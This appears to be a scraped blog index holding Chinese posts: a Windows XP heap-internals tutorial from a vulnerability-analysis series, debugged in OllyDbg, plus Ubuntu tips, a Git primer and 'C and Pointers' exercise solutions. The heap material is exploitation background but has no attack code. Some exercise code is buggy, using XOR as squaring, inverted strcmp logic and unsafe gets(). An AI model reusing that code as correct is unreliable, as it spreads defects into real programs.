HeapFree(hp,0,h3); //free to freelist[2] HeapFree(hp,0,h5); //free to freelist[4] HeapFree(hp,0,h4); //coalese h3,h4,h5,link the large block to freelist[8] return 0;&#125; 注意：_asm int 3 是中断指令，用来中断程序，因为如果直接加载程序到 Ollydbg ，程序将使用调试态堆管理策略，而调试态堆管理策略和常态堆管理策略有很大不同： （1）调试堆不使用快表，只用空表分配。 （2）所有堆块都被加上了多余的 16 字节尾部用来防止溢出（防止程序溢出而不是堆溢出攻击），这包括 8 个字节的 0xAB 和 8 个字节的 0x00。 （3）块首的标志位不同。 调试 在调试前我们先将我们的调试工具 Ollydbg 设为默认调试器 首先以管理员身份打开 Ollydbg 在菜单栏下找到 选项 --&gt; 选项 在选项的菜单栏中找到杂项，勾选将这份x64dbg设为即时调试器，然后保存 设置完成后，直接进入vc++6.0，编译成功后，我们直接双击运行，如下 单击 “否” ，将自动打开 Ollydbg 并附加上进程，并在断点处停下来。 根据源码可知，中断是发生在HeapCreate函数执行完成后的，HeapCreate执行后会返回堆地址，结果保存在eax中，我们在调试器发现eax值是：0x003A0000 也就是说HeapCreate创建的堆区起始位置在003A0000，即堆表从此位置开始，堆表中依次为段表索引（Segment List）、虚表索引(Virtual Allocation list)、空表使用标识（freelist usage bitmap）和空表索引区。 此处我们只关心堆偏移0x178 处的空表索引区，这个偏移是堆表起始的位置（根据上次我们介绍的堆表结构，堆表包含128的8个字节的flink和blink地址。所以堆表的结束位置在：128*8=1024=0x400,加上偏移，0x178+0x400=0x578） 加上堆基址0x003A0000+0x178=0x003A0178，单击内存1，在内存1中按ctrl+G，输入刚刚计算出的地址，回车，我们来到了这个地址。 如图，这个地址便是free[0]，占8个字节，flink和blink都指向尾块的地址，都是0x003a0688。后面的依次是free[1]、free[2]，依次类推，我们发现free[1]、free[2]…free[127]都指向自身，它们都是空链表。 所以当一个堆刚刚被初始化时，只包含一个空闲态的大块，这个块也叫为&quot;尾块&quot; free[0]指向这个&quot;尾块&quot; 我们转到&quot;尾块&quot;的位置去看看（因为这里只有一个堆块，即free[0]指向的地址，free[0]=0x003a0688） 空闲态的堆块有8个字节的 flink（指向前驱节点） 与 blink（指向后继节点），此处的值均为0x003a0178，这个地址是堆表 free[0] 的地址，实验与理论相符。 实际上，HeapAlloc() 返回的堆地址是指向块身的。在其前面还有8个字节的块首，所以这个堆块起始于0x003a0680。前2个字节为块大小，此处值是0x130, 堆的计算单位是8字节，也就是0x980字节。 注意：堆大小包含块首在内。 堆块分配 堆块要点总结： 堆块的大小包括了块首在内，即如果请求32字节，实际会分配的堆块为40字节：8字节块首＋32字节块身； 堆块的单位是8字节，不足8字节的部分按8字节分配； 初始状态下，快表和空表都为空，不存在精确分配。请求将使用 “次优块” 进行分配（这个“次优块”就是位于偏移 0x0688 处的尾块，见上一节最后一张图） 由于次优分配的发生，分配函数会陆续从尾块中切走一些小块，并修改尾块块首中的 size 信息，最后把 freelist[0] 指向新的尾块位置。 内存请求分配情况 堆句柄 请求字节数 实际分配（堆单位） 实际分配（字节） h1 3 2 16 h2 5 2 16 h3 6 2 16 h4 8 2 16 h5 19 4 32 h6 24 4 32 在调试器中，我们单步走过第一个HeapAlloc，然后观察内存空间。 tips: 对于我们主动设置的int 3指令，如果调试器忽略异常后仍无法步过的话，可以在下一行代码处右键，选择 “此处设为新的eip”。 按上面的分析，执行完h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 3);后，会从0x3a0680地址开始切出一块大小为2个单位（16字节）的空间分配给h1, 新的尾块起始地址则为0x003a0690，flink与blink地址位于0x003a0698和0x003a069c,其值0x003a0178指向freelist[0], freelist[0]则指向新的起始地址0x003a0698，(003a0690+8字节的块首，我们上面有提到过指向块身。) 尾块起始处，如下图，如我们所预期的一样 另外，尾块的大小为0x12e【0x130-2=0x12e个单位（堆的单位，8个字节）】，如上图，也可以验证。 h1所指向的堆块起始位置则是0x003a0680，如上图可知，大小为2个单位 堆表 freelist[0] 处，如下图，如我们所预期的一样 接着，执行h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 5); ，将会从尾块中再切一块大小为2个单位（16字节）的空间给h2，然后freelist[0]指向新的尾块起始地址，新的尾块指针仍指向 freelist[0]，剩下的尾块大小为12e-2=12c个单位。 剩下的依次类推，当执行完h6 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 24);后，堆分配情况如下图所示 剩下的堆大小为 130-2-2-2-2-4-4=120单位，尾块仍指向 freelist[0]（0x003a0178），如下图 到此，堆的分配则执行完了。根据上面的理论可知，堆表中仍只有一个尾块，不存在其它的堆块。 堆块释放 由于前三次释放的堆块在内存中不连续，因此不会发生合并。按照其大小， h1 和 h3 为16字节，则被链入 freelist[2]， h5 为 32字节，则被链入 freelist[4]。 当执行HeapFree(hp, 0, h1)后，h1 会被链入 freelist[2]，所以我们来看看 freelist[2] 的地址； 由于 freelist[0] 的地址为0x003a0178，所以 freelist[2] 的地址为0x003a0188（=0x003a0178 + 2*0x8） 执行前，如下图。freelist[2] 指向自己，还是空表 执行后，根据链表规则freelist[2]会指向h1的地址，如下图，h1则会指向freelist[2] 执行后，原来h1所指向的堆块变为空闲态并指向 freelist[2]。如下图，flink与blink都指向freelist[2]，因为此时freelist[2]链表中就只有一个节点 接着会释放h3，执行HeapFree(hp, 0, h3)，执行完后，h3所指向的堆块会被链入到freelist[2]，并插入到整个链表的末尾。 如下图所示，h3 的 blink（地址0x003a06ac）指向前一个堆块，即原来的h1。h3的flink则指向freelist[2]，因为它是最后一个元素。原来的h1的blink指向freelist[2]，flink指向h3 执行后的freelist[2]（0x003a0188），如下图 形成的链表大概如下： 1freelist[2] &lt;---&gt; h1 &lt;---&gt; h3 **注：**h3的flink与freelist[2]的blink未给出。 再下一步，执行HeapFree(hp, 0, h5);，释放h5所在的堆块，并链入freelist[4] 堆块合并 条件：释放两个相邻的空闲块会发生堆块合并操作 步骤： 进行第四步RtlFreeHeap()，释放 h4 后，进行堆块合并 首先将从空表中摘下 h3,h4,h5 三个空闲块 然后重新计算合并后新堆块的大小，2+2+4=8(堆单位：8字节) 最后按照合并后的大小，把新块连入链表 freelist[8] 我们来看看 freelist[8]（0x003a01b8），如下图 可以看到，0x003a06a8已经被链入freelist[8]中了， freelist[2]（003a0188)中也只剩下 h1（003a0688)，因为 h3 在合并时被摘下了， freelist[4]（00ea0198)也指向自身了，因为 h5 在合并时也被摘下来了 进入0x003a06a8，如下图 可以看到，合并只修改了块首的数据，原来的块身基本不变，大小变成了0x0008，空表指针指向0x003a01b8（就是freelist[8]) 注意： 堆块合并只发生在空表中 因为堆块合并要修改多处指针，比较耗时，所以在强调分配效率的快表中，禁止堆块合并 空表中的第一个块不会向前合并，最后一个不会向后合并 快表的使用 实验环境 备注 操作系统 windows xp sp3虚拟机 分配策略对操作系统很敏感 编译器 Visrual C++ 6.0 编译选项 默认编译选项 build 版本 release 版本 如果使用 debug 版本，实验将会失败 实验代码 12345678910111213141516171819#include &lt;stdio.h&gt;#include &lt;windows.h&gt;void main()&#123; HLOCAL h1,h2,h3,h4; HANDLE hp; hp = HeapCreate(0, 0,0); //Create a heap of dynamically assigned __asm int 3 h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,16); h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,24); HeapFree(hp, 0, h1); HeapFree(hp, 0, h2); HeapFree(hp, 0, h3); HeapFree(hp, 0, h4); h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,16); HeapFree(hp,0,h2);&#125; 注意： ​ 使用快表后，堆结构会发生变化，最主要的变化是 “尾块” 不在位于堆 0x0688 偏移处了，这个位置被快表霸占。 调试 我们先来看看空表索引区发生了哪些变化，如下图 可以看到，在0x003a0178处变为了003a1ee8，不再是0x003a0688 现在我们来看看快表（0x003a0688），在偏移 ox0688处，如下图 可以看到，堆刚初始化，快表是空的 然后我们将将代码调试到，释放完 h4之后，如下图所示 根据四个堆块大小我们可以知道，h1,h2 将会被插入到 Lookaside[1]中，h3 会被插入到 Lookaside[2]中，h4会被插入到 Lookaside[4]中，快表区状态，如下图 可以看到，003a1ea0是 8字节堆块地址，003a1eb0是16字节堆地址，003a1ec8是24字节堆地址 进入003a1ea0，来看看堆块状态，如下图 紫色框的为下一堆块指针，红色框为堆块状态，ox01表示是 Busy 状态 块首只存指向下一堆块的指针，不存再指向前一堆块的指针。 接着申请 16 字节的空间，系统会从 Lookaside[2]中卸载一个堆块分配给程序，同时修改 Lookaside[2] 表头，如下图 可以看到，Lookaside[2]（0x003a0718)处变为空了。 总结 堆的数据结构： 堆块、堆表 堆块：包含块首、块身 堆表：空闲双向链表（freelist）、快速单向链表(lookaside) 占用态的堆块：8字节的块首+块身 空闲态的堆块：16字节的块首（多了flink与blink）+块身。空闲态的堆块变为占用态时，flink与blink所在的空间将变为data区。 参考： 《0day,软件安全漏洞分析技术》 《深入分析 win32 堆结构与管理策略》 “杂乱” 是指堆区经过反复的申请、释放操作之后，原本大片连续的空闲内存区可能 呈现出大小不等且空闲块、占用块相间隔的凌乱状态。 ↩︎ “辨别” 是指堆管理程序必须能够正确地识别哪些内存区域是正在被程序使用的占用块，哪些区域是可以返回给当前请求的空闲块。 ↩︎ “恰当” 是指堆管理程序必须能够比较“经济”地分配空闲内存块。如果用户申请使用 8 个字节，而返回给用户一片 512 字节的连续内存区域并将其标记成占用状态，这将造成大量的内存浪费，以致出现明明有内存却无法满足申请请求的情况。 ↩︎ ”占用态” 是指已经被分配给用户程序的内存 ↩︎ “空闲态” 是指未被分配给用户程序的内存 ↩︎ &quot;次优分配“ 发生时，会先从大块中按请求的大小精确地“割”出一块进行分配，然后给剩下的部分重新标注块首，链入空表。 ↩︎","categories":[{"name":"0day安全","slug":"0day安全","permalink":"https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"堆","slug":"堆","permalink":"https://www.rgzzplus.com/tags/%E5%A0%86/"}]},{"title":"ubuntu命令行编C语言","slug":"ubuntu命令行编C语言","date":"2022-03-29T14:58:54.000Z","updated":"2022-03-29T15:14:04.187Z","comments":true,"path":"2022/03/29/ubuntu命令行编C语言/","link":"","permalink":"https://www.rgzzplus.com/2022/03/29/ubuntu%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%BC%96C%E8%AF%AD%E8%A8%80/","excerpt":"","text":"首先在文本编辑器中编写C代码，并将名字保存为hello.c 在terminal中打开Documents（因为我的hello.c保存在Documents中） terminal中输入：cc hello.c 编译hello.c 执行文件 ：./a.out （在Documents中生成可执行文件，同时也会输出) 详情链接","categories":[{"name":"经验交流","slug":"经验交流","permalink":"https://www.rgzzplus.com/categories/%E7%BB%8F%E9%AA%8C%E4%BA%A4%E6%B5%81/"}],"tags":[{"name":"ubuntu","slug":"ubuntu","permalink":"https://www.rgzzplus.com/tags/ubuntu/"}]},{"title":"ubuntu 20.04突然无法联网","slug":"ubuntu-20-04突然无法联网","date":"2022-03-29T14:53:05.000Z","updated":"2022-03-29T14:57:06.567Z","comments":true,"path":"2022/03/29/ubuntu-20-04突然无法联网/","link":"","permalink":"https://www.rgzzplus.com/2022/03/29/ubuntu-20-04%E7%AA%81%E7%84%B6%E6%97%A0%E6%B3%95%E8%81%94%E7%BD%91/","excerpt":"","text":"解决方法： 在 terminal 下执行如下指令： ping www.baidu.com sudo service network-manager stop sudo rm /var/lib/NetworkManager/NetworkManager.state sudo service network-manager start ping www.baidu.com 之后显示下图表示连接成功。按 Ctrl+C 即可停止。","categories":[{"name":"经验交流","slug":"经验交流","permalink":"https://www.rgzzplus.com/categories/%E7%BB%8F%E9%AA%8C%E4%BA%A4%E6%B5%81/"}],"tags":[{"name":"ubuntu","slug":"ubuntu","permalink":"https://www.rgzzplus.com/tags/ubuntu/"}]},{"title":"ubuntu虚拟机磁盘拓展","slug":"ubuntu虚拟机磁盘拓展","date":"2022-03-29T14:34:19.000Z","updated":"2022-08-01T11:20:30.707Z","comments":true,"path":"2022/03/29/ubuntu虚拟机磁盘拓展/","link":"","permalink":"https://www.rgzzplus.com/2022/03/29/ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E6%8B%93%E5%B1%95/","excerpt":"","text":"今天，我在 VMware 上使用 ubuntu 虚拟机时碰到了一个很棘手的问题—磁盘空间不够用了，我想很多使用 ubuntu 的小伙伴或多或少都会碰到这种情况。 然而，我搜遍了 CSDN 和百度却没有找到答案，让我很是苦恼，最终还是在B站上发现了大佬的视频，帮我解决了磁盘拓展问题。感谢迪迪亚与前端与Linux大佬。 磁盘拓展视频链接","categories":[{"name":"经验交流","slug":"经验交流","permalink":"https://www.rgzzplus.com/categories/%E7%BB%8F%E9%AA%8C%E4%BA%A4%E6%B5%81/"}],"tags":[{"name":"ubuntu","slug":"ubuntu","permalink":"https://www.rgzzplus.com/tags/ubuntu/"}]},{"title":"C和指针编程题--第五章","slug":"C和指针编程题-第五章","date":"2022-03-26T11:33:07.000Z","updated":"2022-08-01T11:17:51.885Z","comments":true,"path":"2022/03/26/C和指针编程题-第五章/","link":"","permalink":"https://www.rgzzplus.com/2022/03/26/C%E5%92%8C%E6%8C%87%E9%92%88%E7%BC%96%E7%A8%8B%E9%A2%98-%E7%AC%AC%E4%BA%94%E7%AB%A0/","excerpt":"","text":"[toc] 第五章—编程题5.9 题目1 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748/** 编译环境：vs2022* 题目简介：输出字符串大写形式* 时间：2022/3/22* 分析：有两种方案：* 1.将标准输入复制到标准输出中，然后在转换大写，* 但是，它只能在使用ASCII码的机器上运行* 2.使用tolower函数* 总结：* 改进：* 作者：人工智障plus*/#define _CRT_SECURE_NO_WARNINGS#include&lt;stdio.h&gt;#include&lt;ctype.h&gt;/** 将标准输入复制到标准输出中，将所有大写字母转换为小写字母。* 如果参数并非大写字母，tolower 函数将不修改，直接返回它的值*//** 方法2：int main(int argc, char *argv[])&#123; int ch; while( (ch = getchar()) != EOF ) &#123; putchar( tolower( ch ) ); &#125; return 0;&#125;**/// 方法1：int main(int argc, char *argv[])&#123; int ch; while( (ch = getchar() ) != EOF) &#123; if( ch &gt;= &#x27;A&#x27; &amp;&amp; ch &lt;= &#x27;Z&#x27; ) ch += &#x27;a&#x27; - &#x27;A&#x27;; putchar( ch ); &#125;&#125; 题目2 1234567891011121314151617181920212223242526272829303132333435363738394041424344/** 编译环境：vs2022* 题目简介：加密字母* 时间：2022/3/22* 分析：字符实际上是较小的整形值，* 加密实际上是改变这个整型值* 总结：* 改进：* 作者：人工智障plus*/#define _CRT_SECURE_NO_WARNINGS#include&lt;stdio.h&gt;#include&lt;ctype.h&gt;int main(int argc, char *argv[])&#123; int ch; while( (ch = getchar()) != EOF ) &#123; //加密 if( (&#x27;a&#x27;&lt;=ch)&amp;&amp;(ch&lt;=&#x27;m&#x27;) ) &#123; putchar(ch+13); &#125; if( (&#x27;m&#x27;&lt;ch)&amp;&amp;(ch&lt;=&#x27;z&#x27;) ) &#123; putchar(ch-&#x27;m&#x27;+&#x27;a&#x27;); &#125; if( (&#x27;A&#x27;&lt;=ch)&amp;&amp;(ch&lt;=&#x27;M&#x27;) ) &#123; putchar(ch+13); &#125; if( (&#x27;M&#x27;&lt;ch)&amp;&amp;(ch&lt;=&#x27;Z&#x27;) ) &#123; putchar(ch-&#x27;M&#x27;+&#x27;A&#x27;); &#125; &#125; return 0;&#125; 题目3 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172/** 编译环境：vs2022* 题目简介：变换二进制* 时间：2022/3/22* 分析：可以设立一个临时值，保存左移位的值* 然后将右移位的值放在原变量中，然后把它们相加* 总结：通过移位和+，来变换它的前后值* 改进：打印二进制* 作者：人工智障plus*/#define _CRT_SECURE_NO_WARNINGS#include&lt;stdio.h&gt;#include&lt;math.h&gt;unsigned int reverse_bits( unsigned int value );void print_bits(unsigned int value);int main(int argc, char *argv[])&#123; unsigned int value = 25; value=reverse_bits(value); printf(&quot;%u\\n&quot;,value); print_bits(value); return 0;&#125;unsigned int reverse_bits( unsigned int value )&#123; unsigned int answer; unsigned int i; answer = 0; /* * 只要i不是0就继续进行。这就使得循环与机器的字长无关， * 从而避免了可移植性问题 */ for( i = 1; i != 0; i &lt;&lt;= 1) &#123; /* * 把旧的answer左移1位，位下一个位留下空间 * 如果value的最后一位是1，answer就与1进行OR操作 * 然后将value右移至下一位 */ answer = answer &lt;&lt; 1; if( value &amp; 1 ) answer = answer | 1; value = value &gt;&gt; 1; &#125; return answer;&#125;//将value二进制形式打印出来void print_bits(unsigned int value)&#123; int len = sizeof(unsigned int) * 8; int idx; int bit; for(idx = 1; idx &lt;= len; idx++)&#123; //从左往右，通过位偏移后，和1取与运算，打印bit位的值 bit = 1 &amp; (value &gt;&gt; (len - idx)); printf(&quot;%d&quot;, bit); //四位一空，方便阅读 if(idx % 4 == 0)&#123; printf(&quot; &quot;); &#125; &#125; printf(&quot;\\n&quot;);&#125; 题目4 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162/** 编译环境：vs2022* 题目简介：位数组* 时间：2022/3/23* 分析：* 总结：字符&#x27;1&#x27;,&#x27;0&#x27;无法打印，所以是方框* 改进：* 作者：人工智障plus*/#define _CRT_SECURE_NO_WARNINGS#include&lt;stdio.h&gt;#include&lt;math.h&gt;void set_bit( char bit_array[], unsigned bit_number );void clear_bit( char bit_array[], unsigned bit_number );void assign_bit( char bit_array[], unsigned bit_number, int value );int test_bit( char bit_array[], unsigned bit_number );int main(int argc, char *argv[])&#123; char array[10]=&#123;&quot;000000000&quot;&#125;; set_bit(array,0); set_bit(array,1); printf(&quot;%s\\n&quot;,array); clear_bit(array,0); printf(&quot;%s\\n&quot;,array); assign_bit(array,2,1); printf(&quot;%s\\n&quot;,array); return 0;&#125;void set_bit( char bit_array[], unsigned bit_number )&#123; bit_array[bit_number] = 1;&#125;void clear_bit( char bit_array[], unsigned bit_number )&#123; bit_array[bit_number] = 0;&#125;void assign_bit( char bit_array[], unsigned bit_number, int value )&#123; if(value == 0) bit_array[bit_number] = 0; else bit_array[bit_number] = 1;&#125;int test_bit( char bit_array[], unsigned bit_number )&#123; if(bit_array[bit_number] != 0) return 1; else return 0;&#125; 题目5 ​ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647/** 编译环境：vs2022* 题目简介：指定位储存* 时间：2022/3/23* 分析：见提示* 总结：用或运算来置一创建掩码。* 改进：* 作者：人工智障plus*/#define _CRT_SECURE_NO_WARNINGS#include&lt;stdio.h&gt;#include&lt;math.h&gt;int store_bit_field(int original_value, int value_to_store, unsigned starting_bit, unsigned ending_bit);int main(int argc, char *argv[])&#123; int result; result = store_bit_field(0xffff, 0x123, 13, 9); printf(&quot;0x%0x\\n&quot;, result); return 0;&#125;int store_bit_field(int original_value, int value_to_store, unsigned starting_bit, unsigned ending_bit)&#123; int mask = 0; int tmp = 0; //制作对应的起始位置掩码 for(int idx = starting_bit; idx &gt;= ending_bit; idx--) &#123; tmp = 1&lt;&lt; idx; mask |= tmp; &#125; //通过掩码将original_value 对应的范围内置0 original_value &amp;= ~mask; //将value_to_store对齐起始和结束位置 value_to_store &lt;&lt;= ending_bit; //value_to_store中将超出范围的部分置0 value_to_store &amp;= mask; //将值和original_value取或保存值 original_value |= value_to_store; return original_value;&#125;","categories":[{"name":"题库/作业","slug":"题库-作业","permalink":"https://www.rgzzplus.com/categories/%E9%A2%98%E5%BA%93-%E4%BD%9C%E4%B8%9A/"}],"tags":[{"name":"C和指针","slug":"C和指针","permalink":"https://www.rgzzplus.com/tags/C%E5%92%8C%E6%8C%87%E9%92%88/"}]},{"title":"C和指针编程题--第四章","slug":"C和指针编程题-第四章","date":"2022-03-22T11:33:07.000Z","updated":"2022-08-01T11:17:46.768Z","comments":true,"path":"2022/03/22/C和指针编程题-第四章/","link":"","permalink":"https://www.rgzzplus.com/2022/03/22/C%E5%92%8C%E6%8C%87%E9%92%88%E7%BC%96%E7%A8%8B%E9%A2%98-%E7%AC%AC%E5%9B%9B%E7%AB%A0/","excerpt":"","text":"[toc] 第四章—编程题4.14 题目1 123456789101112131415161718192021222324252627282930313233343536/** 编译环境：vs2022* 题目简介：用公式计算正数 numb 的平方根* 时间：2022/3/20* 总结：学会使用绝对值函数，整数下用abs()，浮点数下用fabs()*/#define _CRT_SECURE_NO_WARNINGS#include&lt;stdio.h&gt;#include&lt;math.h&gt;int main()&#123; /* * 公式对应值； * n = numb,numb_next = a_1, numb_dnext = a_2 */ double numb, numb_next, numb_dnext; numb = 3; numb_next = 1; numb_dnext = 3; /* * 1.最开始想将下面的if判断用作while循环条件， * 调试发现，numb_next后来一直等于numb_dnext。 * 2.近似值判定条件，即程序停止判定条件， * 用相邻两数相减区绝对值，然后域精确度比较。 */ while (1) &#123; numb_dnext = (numb_next + numb / numb_next) / 2; if (fabs(numb_dnext - numb_next) &lt; 0.00001) break; numb_next = numb_dnext; &#125; printf(&quot;%f&quot;, numb_dnext); return 0;&#125; 题目2 1234567891011121314151617181920212223242526272829303132/** 编译环境：vs2022* 题目简介：打印1~100间质数* 时间：2022/3/20* 总结：这里也可以把内层循环做成函数，放在外面，提高阅读性* 改进：可以将内层循环改为 for(i = (int)sqrt(n); i &gt; 1; i--)* 使得减小其循环次数*/#define _CRT_SECURE_NO_WARNINGS#include&lt;stdio.h&gt;#include&lt;math.h&gt;int main()&#123; int i = 1, n = 0; /* * 1.外层循环取出1~100间所有的整数给n * 2.内层循环判断出n是否是质数 */ for( n = 1; n &lt;= 100; n++) &#123; for( i = n/2; i &gt; 1; i--) &#123; if( (n % i) == 0) break; &#125; if (i == 1) printf(&quot;%d\\n&quot;,n); &#125; return 0; &#125; 题目三 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869/** 编译环境：vs2022* 题目简介：判断三角形类型* 时间：2022/3/20* 分析：1.首先要确定其是一个三角形：任意两边之和大于第三边* 2.再判断三角形类型：直角（勾股定理），等边，等腰* 总结：复制完交换代码，不要忘记更改参数* 改进：将交换单独设置为函数，提高代码可读性* 用while循环使得用户输入失败时，重新输入* 作者：人工智障plus */#define _CRT_SECURE_NO_WARNINGS#include&lt;stdio.h&gt;#include&lt;math.h&gt;int main()&#123; int a,b,c=0; int temp = 0; printf(&quot;请输入三角形三边长度：&quot;); scanf(&quot;%d&quot;,&amp;a); scanf(&quot;%d&quot;,&amp;b); scanf(&quot;%d&quot;,&amp;c); /* * 先判断是不是三角形， * 分解：找出两条小边，再与长边比较 * 或者先找最大边 */ if(a &lt; b) &#123; temp = a; a = b; b = temp; &#125; if(a &lt; c) &#123; temp = a; a = c; c = temp; &#125; if((b+c) &lt; a) &#123; printf(&quot;您输入的数据不能构成一个三角形\\n&quot;); return 0; &#125; /* * 判断三角形类型 */ if( (a==b)&amp;&amp;(b==c) ) &#123; printf(&quot;此三角形是等边三角形\\n&quot;); return 0; &#125; if( (a==b)||(b==c)||(a==c) ) &#123; printf(&quot;此三角形是等腰三角形\\n&quot;); return 0; &#125; if( (a^2)==((b^2)+(c^2)) ) &#123; printf(&quot;此三角形是直角三角形\\n&quot;); return 0; &#125; printf(&quot;此三角形是普通三角形\\n&quot;); return 0;&#125; 题目四 123456789101112131415161718192021222324252627282930313233343536373839404142434445/** 编译环境：vs2022* 题目简介：复制字符串数组到另一个数组，并且正好复制n个* 时间：2022/3/21* 分析：因为始终要控制其长度为n，所以外层循环控制长度，* 循环体内控制复制字符* 总结：了解到一种计算字符数组长度的方法：length=sizeof(a)/sizeof(a[0]);* 改进：增加检查数组长度，以确定传值是否合法* 作者：人工智障plus */#define _CRT_SECURE_NO_WARNINGS#include&lt;stdio.h&gt;#include&lt;math.h&gt;void copy_n( char dst[], char src[], int n);int main()&#123; char a[5]=&#123;&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;e&#x27;&#125;; char b[5]; copy_n(b,a,2); for(int i=0; i&lt;2; i++) printf(&quot;%c&quot;,b[i]); return 0;&#125;/** 确定 src[] 的长度* 1.计算数组长度，失败，sizeof不能在传递参数名的函数内来获取长度* 2.在最后检验字符串结束标志*/void copy_n( char dst[], char src[], int n)&#123; int i; for(i=0; i&lt;n; i++) &#123; if( src[i] != &#x27;\\0&#x27; ) dst[i] = src[i]; else dst[i] = &#x27;\\0&#x27;; &#125;&#125; 题目五 1234567891011121314151617181920212223242526272829303132333435/** 编译环境：vs2022* 题目简介：读取文件文本内容并打印* 时间：2022/3/20* 分析：题目提示已经分析* 总结：strcmp()比较两个字符串，* 两者相等返回0，不相等返回非0值* 改进：可以将输出结果放在一个文件里* 作者：人工智障plus*/#define _CRT_SECURE_NO_WARNINGS#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main()&#123; /* * 设置缓冲区，复制区 */ char buffer[128] = &#123;&#125;; char array[128] = &#123;&#125;; while(1) &#123; gets(buffer); if(!strcmp(array,buffer)) &#123; printf(&quot;%s\\n&quot;,array); &#125; strcpy(array,buffer); &#125; return 0;&#125; 题目六 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748/** 编译环境：vs2022* 题目简介：提取子字符串* 时间：2022/3/20* 分析：题目提示已经分析* 总结：* 改进：增加判定函数是否执行，反馈输出提示* 作者：人工智障plus*/#define _CRT_SECURE_NO_WARNINGS#include&lt;stdio.h&gt;#include&lt;string.h&gt;int substr( char dst[], char src[], int start, int len);int main(int argc, char *argv[])&#123; char dst[10]; char src[10] = &quot;sbsbdsb&quot;; substr(dst,src,1,2); printf(&quot;%s\\n&quot;,dst); return 0;&#125;int substr( char dst[], char src[], int start, int len)&#123; /*start或len为负数*/ if( (start&lt;0)||(len&lt;0) ) return 0; /*指定位置超过src数组尾部*/ int i = 0; while( src[i] != &#x27;\\0&#x27; ) i++; if( start&gt;i ) return 0; /*提取字符串*/ for(i=0; i&lt;len; i++) &#123; dst[i] = src[start+i]; &#125; return 1;&#125; 题目七 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354/** 编译环境：vs2022* 题目简介：去除空格* 时间：2022/3/22* 分析：见注释* 总结：传数组名，相当于传指针，能通过函数修改实参* 改进：增加判定函数是否执行，反馈输出提示，让用户自己输入数据* 作者：人工智障plus*/#define _CRT_SECURE_NO_WARNINGS#include&lt;stdio.h&gt;#include&lt;string.h&gt;void deblank(char string[]);int main(int argc, char* argv[])&#123; char string[10] = &quot;s bb &quot;; deblank(string); printf(&quot;%s&quot;, string); return 0;&#125;void deblank(char string[])&#123; int i = 0; /* * 外层循环遍历数组， * 通过判断当前和下一字符是否为空格， * 来决定是否删除后一空格 */ while (string[i] != &#x27;\\0&#x27;) &#123; if ((string[i] == &#x27; &#x27;) &amp;&amp; (string[i + 1] == &#x27; &#x27;)) &#123; int j = i; /* * 删除实现：将第一个空格后面所有的字符向前挪动一位 * 这里有个坑：当有三个连续空格时，如果不将i自减一位， * 最后输出还是有两个连续的空格， * 原因：忽略了第一次判断的空格。 */ while (string[j] != &#x27;\\0&#x27;) &#123; string[j] = string[j + 1]; j++; &#125; i--; &#125; i++; &#125;&#125;","categories":[{"name":"题库/作业","slug":"题库-作业","permalink":"https://www.rgzzplus.com/categories/%E9%A2%98%E5%BA%93-%E4%BD%9C%E4%B8%9A/"}],"tags":[{"name":"C和指针","slug":"C和指针","permalink":"https://www.rgzzplus.com/tags/C%E5%92%8C%E6%8C%87%E9%92%88/"}]},{"title":"Git快速入门","slug":"Git快速入门","date":"2022-03-19T13:12:59.000Z","updated":"2022-08-01T11:18:05.070Z","comments":true,"path":"2022/03/19/Git快速入门/","link":"","permalink":"https://www.rgzzplus.com/2022/03/19/Git%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/","excerpt":"","text":"[toc] 阅前提示：本文来自小甲鱼的极客Python之Git实用教程总结，完全是我自己记得笔记，在这里分享给大家，如有不足和错误，请在评论区告诉我 Git 记录的是什么？ Git 是将每个版本独立保存 工作区域、暂存区域和 Git 仓库 ​ 工作区（WORKING DIRECTORY）: 直接编辑文件的地方，肉眼可见直接操作； 暂存区（STAGIN AREA）：数据（快照）暂时存放的地方； **版本库（GIT DIRECTORT(RESPOSITORY)）：**存放已经提交的数据，push 的时候，就是把这个区的数据 push 到远程git仓库了。 Git 工作流程 Git的工作流程一般是酱紫: 在工作目录中添加、修改文件 将需要进行版本管理的文件放入暂存区域 将暂存区域的文件提交到Git仓库 Git管理的文件有三种状态: 已修改(modified) 已暂存(staged) 已提交(committed) 实战 将工作目录的文件放到Git仓库只需要两步: git add 文件名 //添加文件 git commit -m &quot;你干了啥” //提交并注释 其它命令 git status //查看状态 git log //查看历史提交的最终版本，即 commit实体 reset //撤回提交，即将最后一次存放到Git仓库里的文件撤回到暂存区 checkout //从历史快照（或者暂存区域）中拷贝文件到工作目录 几个命令的功能 add 用于把工作目录的文件放入暂存区域 commit 用于把暂存区域的文件提交到 Git 仓库 reset 用于把 Git 仓库的文件还原到暂存区域 checkout 用于把暂存区域的文件还原到工作目录 reset 命令选项（危险） git reset --mixed HEAD～ 移动 HEAD 的指向,将其指向上一个快照 将 HEAD 移动后指向的快照回滚到暂存区域 git reset --soft HEAD～ 移动 HEAD 的指向,将其指向上一个快照 git reset --hard HEAD~ 移动 HEAD 的指向,将其指向上一个快照 将 HEAD 移动后指向的快照回滚到暂存区域 将暂存区域的文件还原到工作目录 reset 命令回滚快照三部曲 移动 HEAD 的指向(–soft) 将快照回滚到暂存区域([–mixed]，默认) 将暂存区域还原到工作目录（–hard) 回滚个别文件 git reset 版本快照 文件名/路径 HEAD 